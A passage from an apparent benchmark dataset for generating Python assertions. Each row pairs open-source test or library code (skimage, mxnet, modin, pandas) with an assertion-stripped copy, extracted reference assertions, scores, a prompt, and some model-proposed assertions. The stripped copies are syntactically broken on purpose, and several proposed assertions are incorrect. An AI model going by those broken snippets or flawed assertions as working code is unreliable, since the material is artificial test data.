5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['paths', 'self.imgs', 'img', 'num', 'n', 'f', 'img.filename', 'val', 'img.conserve_memory', 'array']
*Code:

1import os
2
3import numpy as np
4
5from skimage import data_dir
6from skimage.io.collection import MultiImage, ImageCollection
7
8import six
9
10
11class TestMultiImage():
12
13    def setUp(self):
14        # This multipage TIF file was created with imagemagick:
15        # convert im1.tif im2.tif -adjoin multipage.tif
16        paths = [os.path.join(data_dir, 'multipage.tif'),
17                 os.path.join(data_dir, 'no_time_for_that.gif')]
18        self.imgs = [MultiImage(paths[0]),
19                     MultiImage(paths[0], conserve_memory=False),
20                     MultiImage(paths[1]),
21                     MultiImage(paths[1], conserve_memory=False),
22                     ImageCollection(paths[0]),
23                     ImageCollection(paths[1], conserve_memory=False),
24                     ImageCollection('%s:%s' % (paths[0], paths[1]))]
25
26    def test_len(self):
27
28    def test_slicing(self):
29        img = self.imgs[-1]
30
31    def test_getitem(self):
32        for img in self.imgs:
33            num = len(img)
34
35            for i in range(-num, num):
36
37                          img[0], img[1])
38
39            def return_img(n):
40                return img[n]
41
42    def test_files_property(self):
43        for img in self.imgs:
44            if isinstance(img, ImageCollection):
45                continue
46
47
48            def set_filename(f):
49                img.filename = f
50
51    def test_conserve_memory_property(self):
52        for img in self.imgs:
53
54            def set_mem(val):
55                img.conserve_memory = val
56
57    def test_concatenate(self):
58        for img in self.imgs:
59            if img[0].shape != img[-1].shape:
60                continue
61            array = img.concatenate()
62
63
64if __name__ == ""__main__"":
65    from numpy.testing import run_module_suite
66    run_module_suite()
67",3380,"[[16, 'paths', '!=', [], ""paths list shouldn't be empty because it is used as input in creating images""],
 [32, 'img', '!=', None, 'img variable must not be None because it is used as iterable'],
 [33, 'num', '>=', 0, 'The len of img should be positive because it is used in range operation'],
 [39, 'n', '>=', 0, 'The index should be a positive number'],
 [48, 'f', '!=', None, 'f variable must not be None because it is used in set_filename method'],
 [54, 'val', '!=', None, 'val variable must not be None because it is used in set_mem method'],
 [61, 'array', '!=', None, 'array should not be None after concatenate operation']]"
kevinthesun/mxnet,"# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

# pylint: skip-file
import sys
import mxnet as mx
import numpy as np
import tempfile
import random
import string

def test_recordio():
    frec = tempfile.mktemp()
    N = 255

    writer = mx.recordio.MXRecordIO(frec, 'w')
    for i in range(N):
        if sys.version_info[0] < 3:
            writer.write(str(chr(i)))
        else:
            writer.write(bytes(str(chr(i)), 'utf-8'))
    del writer

    reader = mx.recordio.MXRecordIO(frec, 'r')
    for i in range(N):
        res = reader.read()
        if sys.version_info[0] < 3:
            assert res == str(chr(i))
        else:
            assert res == bytes(str(chr(i)), 'utf-8')

def test_indexed_recordio():
    fidx = tempfile.mktemp()
    frec = tempfile.mktemp()
    N = 255

    writer = mx.recordio.MXIndexedRecordIO(fidx, frec, 'w')
    for i in range(N):
        if sys.version_info[0] < 3:
            writer.write_idx(i, str(chr(i)))
        else:
            writer.write_idx(i, bytes(str(chr(i)), 'utf-8'))
    del writer

    reader = mx.recordio.MXIndexedRecordIO(fidx, frec, 'r')
    keys = reader.keys
    assert sorted(keys) == [i for i in range(N)]
    random.shuffle(keys)
    for i in keys:
        res = reader.read_idx(i)
        if sys.version_info[0] < 3:
            assert res == str(chr(i))
        else:
            assert res == bytes(str(chr(i)), 'utf-8')

def test_recordio_pack_label():
    frec = tempfile.mktemp()
    N = 255

    for i in range(1, N):
        for j in range(N):
            content = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(j))
            content = content.encode('utf-8')
            label = np.random.uniform(size=i).astype(np.float32)
            header = (0, label, 0, 0)
            s = mx.recordio.pack(header, content)
            rheader, rcontent = mx.recordio.unpack(s)
            assert (label == rheader.label).all()
            assert content == rcontent

if __name__ == '__main__':
    test_recordio_pack_label()
    test_recordio()
    test_indexed_recordio()
","
1# Licensed to the Apache Software Foundation (ASF) under one
2# or more contributor license agreements.  See the NOTICE file
3# distributed with this work for additional information
4# regarding copyright ownership.  The ASF licenses this file
5# to you under the Apache License, Version 2.0 (the
6# ""License""); you may not use this file except in compliance
7# with the License.  You may obtain a copy of the License at
8#
9#   http://www.apache.org/licenses/LICENSE-2.0
10#
11# Unless required by applicable law or agreed to in writing,
12# software distributed under the License is distributed on an
13# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
14# KIND, either express or implied.  See the License for the
15# specific language governing permissions and limitations
16# under the License.
17
18# pylint: skip-file
19import sys
20import mxnet as mx
21import numpy as np
22import tempfile
23import random
24import string
25
26def test_recordio():
27    frec = tempfile.mktemp()
28    N = 255
29
30    writer = mx.recordio.MXRecordIO(frec, 'w')
31    for i in range(N):
32        if sys.version_info[0] < 3:
33            writer.write(str(chr(i)))
34        else:
35            writer.write(bytes(str(chr(i)), 'utf-8'))
36    del writer
37
38    reader = mx.recordio.MXRecordIO(frec, 'r')
39    for i in range(N):
40        res = reader.read()
41        if sys.version_info[0] < 3:
42        else:
43
44def test_indexed_recordio():
45    fidx = tempfile.mktemp()
46    frec = tempfile.mktemp()
47    N = 255
48
49    writer = mx.recordio.MXIndexedRecordIO(fidx, frec, 'w')
50    for i in range(N):
51        if sys.version_info[0] < 3:
52            writer.write_idx(i, str(chr(i)))
53        else:
54            writer.write_idx(i, bytes(str(chr(i)), 'utf-8'))
55    del writer
56
57    reader = mx.recordio.MXIndexedRecordIO(fidx, frec, 'r')
58    keys = reader.keys
59    random.shuffle(keys)
60    for i in keys:
61        res = reader.read_idx(i)
62        if sys.version_info[0] < 3:
63        else:
64
65def test_recordio_pack_label():
66    frec = tempfile.mktemp()
67    N = 255
68
69    for i in range(1, N):
70        for j in range(N):
71            content = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(j))
72            content = content.encode('utf-8')
73            label = np.random.uniform(size=i).astype(np.float32)
74            header = (0, label, 0, 0)
75            s = mx.recordio.pack(header, content)
76            rheader, rcontent = mx.recordio.unpack(s)
77
78if __name__ == '__main__':
79    test_recordio_pack_label()
80    test_recordio()
81    test_indexed_recordio()
82","[['res', '==', 'str(chr(i))'], ['res', '==', 'bytes(str(chr(i))'], ['res', '==', 'str(chr(i))'], ['res', '==', 'bytes(str(chr(i))'], ['(label', '==', 'rheader.label).all()'], ['content', '==', 'rcontent']]",7,6,0.8571428571428571,0.0021291696238466,"['frec', 'N', 'writer', 'reader', 'res', 'fidx', 'keys', 'content', 'label', 'header', 's', 'rheader', 'rcontent']",13,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['frec', 'N', 'writer', 'reader', 'res', 'fidx', 'keys', 'content', 'label', 'header', 's', 'rheader', 'rcontent']
*Code:

1# Licensed to the Apache Software Foundation (ASF) under one
2# or more contributor license agreements.  See the NOTICE file
3# distributed with this work for additional information
4# regarding copyright ownership.  The ASF licenses this file
5# to you under the Apache License, Version 2.0 (the
6# ""License""); you may not use this file except in compliance
7# with the License.  You may obtain a copy of the License at
8#
9#   http://www.apache.org/licenses/LICENSE-2.0
10#
11# Unless required by applicable law or agreed to in writing,
12# software distributed under the License is distributed on an
13# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
14# KIND, either express or implied.  See the License for the
15# specific language governing permissions and limitations
16# under the License.
17
18# pylint: skip-file
19import sys
20import mxnet as mx
21import numpy as np
22import tempfile
23import random
24import string
25
26def test_recordio():
27    frec = tempfile.mktemp()
28    N = 255
29
30    writer = mx.recordio.MXRecordIO(frec, 'w')
31    for i in range(N):
32        if sys.version_info[0] < 3:
33            writer.write(str(chr(i)))
34        else:
35            writer.write(bytes(str(chr(i)), 'utf-8'))
36    del writer
37
38    reader = mx.recordio.MXRecordIO(frec, 'r')
39    for i in range(N):
40        res = reader.read()
41        if sys.version_info[0] < 3:
42        else:
43
44def test_indexed_recordio():
45    fidx = tempfile.mktemp()
46    frec = tempfile.mktemp()
47    N = 255
48
49    writer = mx.recordio.MXIndexedRecordIO(fidx, frec, 'w')
50    for i in range(N):
51        if sys.version_info[0] < 3:
52            writer.write_idx(i, str(chr(i)))
53        else:
54            writer.write_idx(i, bytes(str(chr(i)), 'utf-8'))
55    del writer
56
57    reader = mx.recordio.MXIndexedRecordIO(fidx, frec, 'r')
58    keys = reader.keys
59    random.shuffle(keys)
60    for i in keys:
61        res = reader.read_idx(i)
62        if sys.version_info[0] < 3:
63        else:
64
65def test_recordio_pack_label():
66    frec = tempfile.mktemp()
67    N = 255
68
69    for i in range(1, N):
70        for j in range(N):
71            content = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(j))
72            content = content.encode('utf-8')
73            label = np.random.uniform(size=i).astype(np.float32)
74            header = (0, label, 0, 0)
75            s = mx.recordio.pack(header, content)
76            rheader, rcontent = mx.recordio.unpack(s)
77
78if __name__ == '__main__':
79    test_recordio_pack_label()
80    test_recordio()
81    test_indexed_recordio()
82",4146,"[[26, 'frec', '!=', '', ""Temporary file reference 'frec' shouldn't be empty""],
 [37, 'reader', '!=', '', ""Reader instance should not be empty after instantiation""],
 [37, 'res', '!=', '', ""'res' should have a value after the reader.read() operation""],
 [44, 'fidx', '!=', '', ""Temporary file reference 'fidx' shouldn't be empty""],
 [44, 'frec', '!=', '', ""Temporary file reference 'frec' shouldn't be empty""],
 [56, 'reader', '!=', '', ""Reader instance should not be empty after instantiation""],
 [56, 'keys', '!=', '', ""'keys' should have values after the reader.keys operation""],
 [56, 'res', '!=', '', ""'res' should have a value after the reader.read_idx() operation""],
 [65, 'frec', '!=', '', ""Temporary file reference 'frec' shouldn't be empty""],
 [65, 'content', '!=', '', ""'content' should have a value after being encoded""],
 [65, 'label', '!=', '', ""'label' should have a value after np.random.uniform() operation""],
 [77, 'rheader', '!=', '', ""'rheader' should have a value after the unpack() operation""],
 [77, 'rcontent', '!=', '', ""'rcontent' should have a value after the unpack() operation""]]"
modin-project/modin,"# Licensed to Modin Development Team under one or more contributor license agreements.
# See the NOTICE file distributed with this work for additional information regarding
# copyright ownership.  The Modin Development Team licenses this file to you under the
# Apache License, Version 2.0 (the ""License""); you may not use this file except in
# compliance with the License.  You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software distributed under
# the License is distributed on an ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF
# ANY KIND, either express or implied. See the License for the specific language
# governing permissions and limitations under the License.

""""""Module that houses compat functions and objects for `pandas.io.common`.""""""

from contextlib import contextmanager
from collections import namedtuple

from pandas import DataFrame as pandas_DataFrame
from pandas.io.common import get_handle as pandas_get_handle
from pandas.core.aggregation import reconstruct_func
from pandas.core.base import DataError, SpecificationError

from modin.utils import _inherit_docstrings

_HandleWrapper = namedtuple(""_HandleWrapper"", [""handle""])


@contextmanager
@_inherit_docstrings(pandas_get_handle)
def get_handle(
    path_or_buf,
    mode: str,
    encoding=None,
    compression=None,
    memory_map=False,
    is_text=True,
    errors=None,
    storage_options=None,
):
    assert storage_options is None
    f, handles = pandas_get_handle(
        path_or_buf,
        mode=mode,
        encoding=encoding,
        compression=compression,
        memory_map=memory_map,
        is_text=is_text,
        errors=errors,
    )
    try:
        yield _HandleWrapper(handle=f)
    finally:
        for handle in handles:
            try:
                handle.close()
            except (OSError, ValueError):
                pass


def pandas_pivot_table(df, **kwargs):  # noqa: PR01, RT01
    """"""Perform pandas pivot_table against a dataframe ignoring unsupported args.""""""
    unsupported_sort = kwargs.pop(""sort"", None)
    assert (
        unsupported_sort is None
    ), ""Unsupported argument passed to DataFrame.pivot_table: sort""
    return df.pivot_table(**kwargs)


def pandas_convert_dtypes(df, **kwargs):  # noqa: PR01, RT01
    """"""Perform pandas convert_dtypes against a dataframe or series ignoring unsupported args.""""""
    unsupported_convert = kwargs.pop(""convert_floating"", None)
    assert (
        unsupported_convert is None
    ), ""Unsupported argument passed to DataFrame.convert_dtypes: convert_floating""
    return df.convert_dtypes(**kwargs)


_RESULT_NAMES_DEFAULT = (""self"", ""other"")


def pandas_compare(df, **kwargs):
    result_names = kwargs.pop(""result_names"", _RESULT_NAMES_DEFAULT)
    assert (
        result_names == _RESULT_NAMES_DEFAULT
    ), ""Unsupported argument passed to DataFrame.compare: result_names""
    return df.compare(**kwargs)


def pandas_dataframe_join(df, other, **kwargs):
    validate = kwargs.pop(""validate"", None)
    assert validate is None, ""Unsupported argument passed to DataFrame.join: validate""
    return pandas_DataFrame.join(df, other, **kwargs)


def pandas_reset_index(df, **kwargs):
    allow_duplicates = kwargs.pop(""allow_duplicates"", None)
    names = kwargs.pop(""names"", None)
    assert (
        allow_duplicates is None
    ), ""Unsupported argument passed to reset_index: allow_duplicates""
    assert names is None, ""Unsupported argument passed to reset_index: name""
    return pandas_DataFrame.reset_index(df, **kwargs)


def pandas_to_csv(df, **kwargs):
    kwargs[""line_terminator""] = kwargs.pop(""lineterminator"", None)
    return df.to_csv(**kwargs)


__all__ = [
    ""get_handle"",
    ""pandas_pivot_table"",
    ""pandas_convert_dtypes"",
    ""pandas_compare"",
    ""pandas_dataframe_join"",
    ""reconstruct_func"",
    ""pandas_reset_index"",
    ""pandas_to_csv"",
    ""DataError"",
    ""SpecificationError"",
]
","
1# Licensed to Modin Development Team under one or more contributor license agreements.
2# See the NOTICE file distributed with this work for additional information regarding
3# copyright ownership.  The Modin Development Team licenses this file to you under the
4# Apache License, Version 2.0 (the ""License""); you may not use this file except in
5# compliance with the License.  You may obtain a copy of the License at
6#
7#     http://www.apache.org/licenses/LICENSE-2.0
8#
9# Unless required by applicable law or agreed to in writing, software distributed under
10# the License is distributed on an ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF
11# ANY KIND, either express or implied. See the License for the specific language
12# governing permissions and limitations under the License.
13
14""""""Module that houses compat functions and objects for `pandas.io.common`.""""""
15
16from contextlib import contextmanager
17from collections import namedtuple
18
19from pandas import DataFrame as pandas_DataFrame
20from pandas.io.common import get_handle as pandas_get_handle
21from pandas.core.aggregation import reconstruct_func
22from pandas.core.base import DataError, SpecificationError
23
24from modin.utils import _inherit_docstrings
25
26_HandleWrapper = namedtuple(""_HandleWrapper"", [""handle""])
27
28
29@contextmanager
30@_inherit_docstrings(pandas_get_handle)
31def get_handle(
32    path_or_buf,
33    mode: str,
34    encoding=None,
35    compression=None,
36    memory_map=False,
37    is_text=True,
38    errors=None,
39    storage_options=None,
40):
41    f, handles = pandas_get_handle(
42        path_or_buf,
43        mode=mode,
44        encoding=encoding,
45        compression=compression,
46        memory_map=memory_map,
47        is_text=is_text,
48        errors=errors,
49    )
50    try:
51        yield _HandleWrapper(handle=f)
52    finally:
53        for handle in handles:
54            try:
55                handle.close()
56            except (OSError, ValueError):
57                pass
58
59
60def pandas_pivot_table(df, **kwargs):  # noqa: PR01, RT01
61    """"""Perform pandas pivot_table against a dataframe ignoring unsupported args.""""""
62    unsupported_sort = kwargs.pop(""sort"", None)
63        unsupported_sort is None
64    ), ""Unsupported argument passed to DataFrame.pivot_table: sort""
65    return df.pivot_table(**kwargs)
66
67
68def pandas_convert_dtypes(df, **kwargs):  # noqa: PR01, RT01
69    """"""Perform pandas convert_dtypes against a dataframe or series ignoring unsupported args.""""""
70    unsupported_convert = kwargs.pop(""convert_floating"", None)
71        unsupported_convert is None
72    ), ""Unsupported argument passed to DataFrame.convert_dtypes: convert_floating""
73    return df.convert_dtypes(**kwargs)
74
75
76_RESULT_NAMES_DEFAULT = (""self"", ""other"")
77
78
79def pandas_compare(df, **kwargs):
80    result_names = kwargs.pop(""result_names"", _RESULT_NAMES_DEFAULT)
81        result_names == _RESULT_NAMES_DEFAULT
82    ), ""Unsupported argument passed to DataFrame.compare: result_names""
83    return df.compare(**kwargs)
84
85
86def pandas_dataframe_join(df, other, **kwargs):
87    validate = kwargs.pop(""validate"", None)
88    return pandas_DataFrame.join(df, other, **kwargs)
89
90
91def pandas_reset_index(df, **kwargs):
92    allow_duplicates = kwargs.pop(""allow_duplicates"", None)
93    names = kwargs.pop(""names"", None)
94        allow_duplicates is None
95    ), ""Unsupported argument passed to reset_index: allow_duplicates""
96    return pandas_DataFrame.reset_index(df, **kwargs)
97
98
99def pandas_to_csv(df, **kwargs):
100    kwargs[""line_terminator""] = kwargs.pop(""lineterminator"", None)
101    return df.to_csv(**kwargs)
102
103
104__all__ = [
105    ""get_handle"",
106    ""pandas_pivot_table"",
107    ""pandas_convert_dtypes"",
108    ""pandas_compare"",
109    ""pandas_dataframe_join"",
110    ""reconstruct_func"",
111    ""pandas_reset_index"",
112    ""pandas_to_csv"",
113    ""DataError"",
114    ""SpecificationError"",
115]
116","[['storage_options', '==', 'None'], ['(', '==', 'True'], ['(', '==', 'True'], ['(', '==', 'True'], ['validate', '==', 'None'], ['(', '==', 'True'], ['names', '==', 'None']]",7,7,1.0,0.0017460713394861,"['_HandleWrapper', 'f', 'handles', 'df', '**kwargs', 'unsupported_sort', 'unsupported_convert', '_RESULT_NAMES_DEFAULT', 'result_names', 'other', 'validate', 'allow_duplicates', 'names', 'kwargs[""line_terminator""]', '__all__']",15,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['_HandleWrapper', 'f', 'handles', 'df', '**kwargs', 'unsupported_sort', 'unsupported_convert', '_RESULT_NAMES_DEFAULT', 'result_names', 'other', 'validate', 'allow_duplicates', 'names', 'kwargs[""line_terminator""]', '__all__']
*Code:

1# Licensed to Modin Development Team under one or more contributor license agreements.
2# See the NOTICE file distributed with this work for additional information regarding
3# copyright ownership.  The Modin Development Team licenses this file to you under the
4# Apache License, Version 2.0 (the ""License""); you may not use this file except in
5# compliance with the License.  You may obtain a copy of the License at
6#
7#     http://www.apache.org/licenses/LICENSE-2.0
8#
9# Unless required by applicable law or agreed to in writing, software distributed under
10# the License is distributed on an ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF
11# ANY KIND, either express or implied. See the License for the specific language
12# governing permissions and limitations under the License.
13
14""""""Module that houses compat functions and objects for `pandas.io.common`.""""""
15
16from contextlib import contextmanager
17from collections import namedtuple
18
19from pandas import DataFrame as pandas_DataFrame
20from pandas.io.common import get_handle as pandas_get_handle
21from pandas.core.aggregation import reconstruct_func
22from pandas.core.base import DataError, SpecificationError
23
24from modin.utils import _inherit_docstrings
25
26_HandleWrapper = namedtuple(""_HandleWrapper"", [""handle""])
27
28
29@contextmanager
30@_inherit_docstrings(pandas_get_handle)
31def get_handle(
32    path_or_buf,
33    mode: str,
34    encoding=None,
35    compression=None,
36    memory_map=False,
37    is_text=True,
38    errors=None,
39    storage_options=None,
40):
41    f, handles = pandas_get_handle(
42        path_or_buf,
43        mode=mode,
44        encoding=encoding,
45        compression=compression,
46        memory_map=memory_map,
47        is_text=is_text,
48        errors=errors,
49    )
50    try:
51        yield _HandleWrapper(handle=f)
52    finally:
53        for handle in handles:
54            try:
55                handle.close()
56            except (OSError, ValueError):
57                pass
58
59
60def pandas_pivot_table(df, **kwargs):  # noqa: PR01, RT01
61    """"""Perform pandas pivot_table against a dataframe ignoring unsupported args.""""""
62    unsupported_sort = kwargs.pop(""sort"", None)
63        unsupported_sort is None
64    ), ""Unsupported argument passed to DataFrame.pivot_table: sort""
65    return df.pivot_table(**kwargs)
66
67
68def pandas_convert_dtypes(df, **kwargs):  # noqa: PR01, RT01
69    """"""Perform pandas convert_dtypes against a dataframe or series ignoring unsupported args.""""""
70    unsupported_convert = kwargs.pop(""convert_floating"", None)
71        unsupported_convert is None
72    ), ""Unsupported argument passed to DataFrame.convert_dtypes: convert_floating""
73    return df.convert_dtypes(**kwargs)
74
75
76_RESULT_NAMES_DEFAULT = (""self"", ""other"")
77
78
79def pandas_compare(df, **kwargs):
80    result_names = kwargs.pop(""result_names"", _RESULT_NAMES_DEFAULT)
81        result_names == _RESULT_NAMES_DEFAULT
82    ), ""Unsupported argument passed to DataFrame.compare: result_names""
83    return df.compare(**kwargs)
84
85
86def pandas_dataframe_join(df, other, **kwargs):
87    validate = kwargs.pop(""validate"", None)
88    return pandas_DataFrame.join(df, other, **kwargs)
89
90
91def pandas_reset_index(df, **kwargs):
92    allow_duplicates = kwargs.pop(""allow_duplicates"", None)
93    names = kwargs.pop(""names"", None)
94        allow_duplicates is None
95    ), ""Unsupported argument passed to reset_index: allow_duplicates""
96    return pandas_DataFrame.reset_index(df, **kwargs)
97
98
99def pandas_to_csv(df, **kwargs):
100    kwargs[""line_terminator""] = kwargs.pop(""lineterminator"", None)
101    return df.to_csv(**kwargs)
102
103
104__all__ = [
105    ""get_handle"",
106    ""pandas_pivot_table"",
107    ""pandas_convert_dtypes"",
108    ""pandas_compare"",
109    ""pandas_dataframe_join"",
110    ""reconstruct_func"",
111    ""pandas_reset_index"",
112    ""pandas_to_csv"",
113    ""DataError"",
114    ""SpecificationError"",
115]
116",5605,"[31, 'path_or_buf', '!=', None, ""path_or_buf must be specified to open a file""],
[31, 'mode', '!=', None, ""mode must be specified to determine how to open the file""],
[60, 'df', '!=', None, ""df must be provided for pandas_pivot_table to operate on""],
[68, 'df', '!=', None, ""df must be provided for pandas_convert_dtypes to operate on""],
[79, 'df', '!=', None, ""df must be provided for pandas_compare to operate on""],
[86, 'df', '!=', None, ""df must be provided for pandas_dataframe_join to operate on""],
[86, 'other', '!=', None, ""other DataFrame must be provided for pandas_dataframe_join to merge""],
[91, 'df', '!=', None, ""df must be provided for pandas_reset_index to operate on""],
[99, 'df', '!=', None, ""df must be provided for pandas_to_csv to generate csv file""],
[100, 'kwargs[""line_terminator""]', '!=', None, ""line_terminator must be provided for pandas_to_csv to end each line of the csv file""]"
cbertinato/pandas,"import pandas as pd
import pandas.util.testing as tm


def test_getitem_callable():
    # GH 12533
    s = pd.Series(4, index=list('ABCD'))
    result = s[lambda x: 'A']
    assert result == s.loc['A']

    result = s[lambda x: ['A', 'B']]
    tm.assert_series_equal(result, s.loc[['A', 'B']])

    result = s[lambda x: [True, False, True, True]]
    tm.assert_series_equal(result, s.iloc[[0, 2, 3]])


def test_setitem_callable():
    # GH 12533
    s = pd.Series([1, 2, 3, 4], index=list('ABCD'))
    s[lambda x: 'A'] = -1
    tm.assert_series_equal(s, pd.Series([-1, 2, 3, 4], index=list('ABCD')))


def test_setitem_other_callable():
    # GH 13299
    inc = lambda x: x + 1

    s = pd.Series([1, 2, -1, 4])
    s[s < 0] = inc

    expected = pd.Series([1, 2, inc, 4])
    tm.assert_series_equal(s, expected)
","
1import pandas as pd
2import pandas.util.testing as tm
3
4
5def test_getitem_callable():
6    # GH 12533
7    s = pd.Series(4, index=list('ABCD'))
8    result = s[lambda x: 'A']
9
10    result = s[lambda x: ['A', 'B']]
11
12    result = s[lambda x: [True, False, True, True]]
13
14
15def test_setitem_callable():
16    # GH 12533
17    s = pd.Series([1, 2, 3, 4], index=list('ABCD'))
18    s[lambda x: 'A'] = -1
19
20
21def test_setitem_other_callable():
22    # GH 13299
23    inc = lambda x: x + 1
24
25    s = pd.Series([1, 2, -1, 4])
26    s[s < 0] = inc
27
28    expected = pd.Series([1, 2, inc, 4])
29","[['result', '==', ""s.loc['A']""]]",5,1,0.2,0.0012285012285012,"['s', 'result', ""s[lambda x: 'A']"", 'inc', 's[s < 0]', 'expected']",6,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['s', 'result', ""s[lambda x: 'A']"", 'inc', 's[s < 0]', 'expected']
*Code:

1import pandas as pd
2import pandas.util.testing as tm
3
4
5def test_getitem_callable():
6    # GH 12533
7    s = pd.Series(4, index=list('ABCD'))
8    result = s[lambda x: 'A']
9
10    result = s[lambda x: ['A', 'B']]
11
12    result = s[lambda x: [True, False, True, True]]
13
14
15def test_setitem_callable():
16    # GH 12533
17    s = pd.Series([1, 2, 3, 4], index=list('ABCD'))
18    s[lambda x: 'A'] = -1
19
20
21def test_setitem_other_callable():
22    # GH 13299
23    inc = lambda x: x + 1
24
25    s = pd.Series([1, 2, -1, 4])
26    s[s < 0] = inc
27
28    expected = pd.Series([1, 2, inc, 4])
29",2054,"[[6, 's', '!=', None, 'Series object should be defined before being used'],
[8, ""s[lambda x: 'A']"", '==', 4, 'Lambda function is supposed to return a single item from series s'],
[10, ""s[lambda x: ['A', 'B']]"", '==', [4,4], 'Lambda function is supposed to return a selected items from series s'],
[12, ""s[lambda x: [True, False, True, True]]"", '==', [4,4,4], 'Lambda function is supposed to return selected items from series s based on True or False'],
[16, 's', '!=', None, 'Series object should be defined before being used'],
[18, 's', '!=', None, 'Series object should be used after setting the item'],
[22, 'inc', '!=', None, 'inc should be a lambda function'],
[25, 's', '!=', None, 'Series object should be defined before being used'],
[26, 's[s < 0]', '==', 'inc', 'All negative values in series s should be replaced with the callable inc'],
[28, 'expected', '==', [1,2,'inc',4], 'Expected series should be the same as series s with negative values replaced by inc']]
"
zaufi/pluggable-output-processor,"# -*- coding: utf-8 -*-
#
# This file is a part of Pluggable Output Processor
#
# Copyright (c) 2013-2017 Alex Turbov <i.zaufi@gmail.com>
#
# Pluggable Output Processor is free software: you can redistribute it and/or modify it
# under the terms of the GNU General Public License as published by the
# Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Pluggable Output Processor is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
# See the GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program.  If not, see <http://www.gnu.org/licenses/>.

'''
    Unit tests for terminal helpers
'''

# Project specific imports
from outproc.config import Config
from outproc.term import column_formatter, fg2bg, pos_to_offset

# Standard imports
import pathlib


class term_module_tester:

    def setup_method(self):
        self.config = Config(pathlib.Path('doesnt-matter'))
        self.red_fg = self.config.get_color('some', 'red', with_reset=False)
        self.yellow_fg = self.config.get_color('some', 'yellow+bold')
        self.white_fg = self.config.get_color('some', 'white')


    def fg2bg_test(self):
        assert fg2bg(self.red_fg) == '\x1b[41m'


    def pos_to_offset_0_test(self):
        line = 'Hello Africa'
        colored = self.yellow_fg + line + self.config.color.reset
        #print('{}'.format(repr(colored)))

        pos = pos_to_offset(colored, 0)
        assert pos == 13
        assert colored[pos] == 'H'

